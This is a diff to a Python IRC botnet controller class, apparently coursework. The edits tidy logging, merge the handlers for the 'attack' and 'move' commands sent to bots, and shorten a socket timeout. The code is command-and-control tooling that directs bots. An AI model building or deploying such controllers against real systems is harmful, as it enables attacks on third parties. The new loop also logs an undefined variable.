@@ -43,8 +43,8 @@ class Controller_Client:
         while time.time() < timeout_start + timeout:
             pass
         response = self.get_text() # get response from bots
-        self.log("bot response: " + response)
-        self.log("done")
+        # self.log("bot response: \n" + response)
+        # self.log("done")
 
         # check if msg is a DM
         if ("PRIVMSG" in response) and (self.channel not in response):
@@ -53,7 +53,6 @@ class Controller_Client:
     def __parse_response(self, command, response):
         response_dict = {}
         for line in response.strip().split('\n'):
-            # self.log("LINE:  " + line)
             # get the sender's ID
             sender = line.split(':')[1].split(' ')[0].split('!')[0]
             # get the message sent by the sender
@@ -66,15 +65,19 @@ class Controller_Client:
                 bot_list.append(sender)
             self.log("Found " + str(len(bot_list)) + " bots: " + ", ".join(bot_list))
             return True
-        if command.startswith("attack "):
+        
+        if command.startswith("attack") or command.startswith("move"):
+            for sender in response_dict:
+                self.log(sender + ": " + message)
             return True
-        if command.startswith("move "):
-            return True
+        
         elif command == "quit":
             self.__terminate()
             return True
+        
         elif command == "shutdown":
             return True
+        
         else:
             return False
 
@@ -87,7 +90,6 @@ class Controller_Client:
 
     # Code adapted from: https://pythonspot.com/en/building-an-irc-bot/
     def get_text(self):
-        print("right before recv")
         text = self.recv_msg() #receive the text
         if text.find('PING') != -1:
             self.send_msg('PONG ' + text.split()[1] + 'rn')
@@ -119,14 +121,14 @@ class Controller_Client:
 
     # function for logging messages
     def log(self, message):
-        print(message.strip("\n") + "\n")
+        print(message.strip("\n"))
 
     # functions to send/recv raw messages from IRC server
     def send_msg(self, message):
         self.irc_socket.send(message.encode())
 
     def recv_msg(self):
-        self.irc_socket.settimeout(1.0)
+        self.irc_socket.settimeout(0.5)
         try:
             data = self.irc_socket.recv(2040).decode()  #receive the text
         except socket.timeout:
